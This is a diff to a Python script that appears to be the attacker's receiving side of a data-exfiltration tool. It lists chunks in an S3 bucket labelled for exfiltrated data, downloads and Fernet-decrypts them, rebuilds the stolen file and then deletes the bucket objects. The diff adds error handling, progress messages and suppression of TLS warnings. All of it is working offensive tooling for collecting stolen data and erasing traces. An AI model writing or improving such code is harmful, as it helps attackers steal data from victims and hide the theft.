@@ -4,6 +4,7 @@ import json
 import os
 import math
 from cryptography.fernet import Fernet
+import urllib3
 
 
 key = b'<FERNET_KEY>'
@@ -11,6 +12,8 @@ aws_access_key_id = '<AWS_ACCESS_KEY_ID>'
 aws_secret_access_key = '<AWS_SECRET_ACCESS_KEY_ID>'
 region = '<REGION>'
 exfiltration_bucket_name = '<EXFILTRATION_BUCKET_NAME>'
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 #----------Enviroment Reset (Delete old files, etc)--------------
 if os.path.exists("reconstructedFile.txt"):
@@ -37,7 +40,12 @@ list_response = aws_s3_client.list_objects(
 	Bucket = exfiltration_bucket_name,
 	Delimiter = '/exfiltrated_data'
 )
-list_response_contents = list_response['Contents']
+try:
+	list_response_contents = list_response['Contents']
+except KeyError:
+	print("The fileName + hostName combination was not found")
+	print("Remember bucket contents are deleted once decrypted!")
+	quit()
 fileNames = []
 for content in list_response_contents:
 	name = content['Key'].replace('.txt','')
@@ -45,22 +53,23 @@ for content in list_response_contents:
 	if sys.argv[1] in name and sys.argv[2] in name:
 		fileNames.append(name)
 
-print(fileNames)
 #----------We remove .txt for sorting, just in case--------------
 fileNames.sort(key = lambda x: int(x.split('.')[-1]))
 for i in range(len(fileNames)):
 	fileNames[i] = fileNames[i] + '.txt'
 
+print('--------------------------------------------------------------------------------')
+print('Started decryption process...')
 #----------S3 Download only transfers, so files must be created beforehand----------
 for file in fileNames:
 	name = file.replace('exfiltrated_data/','')
-	print(name)
+	print("Creating file "+ name + " for transfer")
 	file = open('downloadedFiles/'+name , "w+")
 	file.close()
 
 #----------We download files from bucket to the previously created files--------------
 for file in fileNames:
-	print(file)
+	print("Downloading " + file)
 	name = file.replace('exfiltrated_data/','')
 	aws_s3_resource.meta.client.download_file(exfiltration_bucket_name, file, 'downloadedFiles/'+name)
 
@@ -71,6 +80,7 @@ with open('reconstructedFile.txt', 'a+') as finalFile:
 
 		#----------We open the n partition--------------
 		name = file.replace('exfiltrated_data/','')
+		print("Decrypting " + name)
 		file = open('downloadedFiles/'+name , "r")
 		data = file.read()
 		data_bytes = data.encode()
@@ -88,3 +98,6 @@ with open('reconstructedFile.txt', 'a+') as finalFile:
 bucket = aws_s3_resource.Bucket(exfiltration_bucket_name)
 for file in fileNames:
 	aws_s3_resource.Object(exfiltration_bucket_name, file).delete()
+
+print('Finished decryption! Check out reconstructed file')
+print('--------------------------------------------------------------------------------')
